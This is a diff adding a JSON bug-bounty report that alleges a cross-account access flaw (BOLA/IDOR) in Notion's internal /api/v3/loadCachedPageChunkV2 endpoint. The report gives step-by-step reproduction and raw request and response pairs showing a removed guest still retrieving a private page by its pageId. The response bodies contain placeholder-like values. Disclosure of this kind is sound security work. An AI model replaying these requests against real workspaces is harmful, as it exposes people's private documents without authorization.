@@ -1,0 +1,31 @@
+{
+  "program": "Notion Labs, Inc.",
+  "title": "Cross-account access to private pages via /api/v3/loadCachedPageChunkV2 (BOLA / IDOR)",
+  "severity": "high",
+  "asset": "Notion web application (https://www.notion.so/) – internal web API endpoint /api/v3/loadCachedPageChunkV2",
+  "endpoint": "POST /api/v3/loadCachedPageChunkV2",
+  "endpoint_host": "www.notion.so",
+  "object_type": "page",
+  "object_id_parameter": "pageId",
+  "privileged_role": "Account A – workspace owner, creator of the private page",
+  "unprivileged_role": "Account B – guest user in the workspace, removed from the page sharing settings",
+  "summary": "After a guest user is removed from a private page in the UI, they can still retrieve the full contents of that page by calling the internal API directly with the pageId, resulting in cross-account access to private pages (BOLA / IDOR).",
+  "impact": [
+    "A removed guest can continue to read private pages that they are no longer invited to.",
+    "Any user who has ever seen a pageId can retain permanent API-level access to the page contents, even after the owner revokes access.",
+    "This breaks workspace and document isolation and can expose sensitive notes, documents, and internal records stored in Notion."
+  ],
+  "steps": [
+    "Login as Account A (owner) and create a new private page that is not shared with anyone.",
+    "Invite Account B as a guest to that page, then open the page in a browser logged in as Account B.",
+    "In the browser for Account B, open DevTools → Network tab and perform any action that causes the page to load (e.g., refresh). Capture the internal XHR request to /api/v3/loadCachedPageChunkV2 and note the pageId value in the JSON body.",
+    "Back in Account A, remove Account B from the page sharing settings so that they no longer appear as a guest. Confirm in the UI that Account B can no longer open the page via the normal Notion UI.",
+    "While logged in as Account B, use the same browser session or a new tab and send a direct HTTP request to /api/v3/loadCachedPageChunkV2 with the previously captured pageId in the JSON body. Observe that the API still returns the private page content despite Account B no longer being invited to the page."
+  ],
+  "requests": {
+    "privileged_request": "POST /api/v3/loadCachedPageChunkV2 HTTP/1.1\nHost: www.notion.so\nContent-Type: application/json\nCookie: token_v2=REDACTED_ACCOUNT_A_SESSION;\n\n{\n  \"page\": {\n    \"id\": \"2b1e0935-0bb2-8041-b6ff-f2c1e084c2cf\"\n  }\n}",
+    "privileged_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n...\n{\n  \"recordMap\": {\n    \"block\": {\n      \"2b1e0935-0bb2-8041-b6ff-f2c1e084c2cf\": {\n        \"value\": {\n          \"id\": \"2b1e0935-0bb2-8041-b6ff-f2c1e084c2cf\",\n          \"type\": \"page\",\n          \"properties\": {\n            \"title\": [[\"Private test page for BOLA PoC\"]],\n            \"other_property\": [[\"Sensitive content visible here\"]]\n          }\n        }\n      }\n    }\n  }\n}",
+    "unprivileged_request": "POST /api/v3/loadCachedPageChunkV2 HTTP/1.1\nHost: www.notion.so\nContent-Type: application/json\nCookie: token_v2=REDACTED_ACCOUNT_B_SESSION;\n\n{\n  \"page\": {\n    \"id\": \"2b1e0935-0bb2-8041-b6ff-f2c1e084c2cf\"\n  }\n}",
+    "unprivileged_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n...\n{\n  \"recordMap\": {\n    \"block\": {\n      \"2b1e0935-0bb2-8041-b6ff-f2c1e084c2cf\": {\n        \"value\": {\n          \"id\": \"2b1e0935-0bb2-8041-b6ff-f2c1e084c2cf\",\n          \"type\": \"page\",\n          \"properties\": {\n            \"title\": [[\"Private test page for BOLA PoC\"]],\n            \"other_property\": [[\"Sensitive content visible here\"]]\n          }\n        }\n      }\n    }\n  }\n}"
+  }
+}
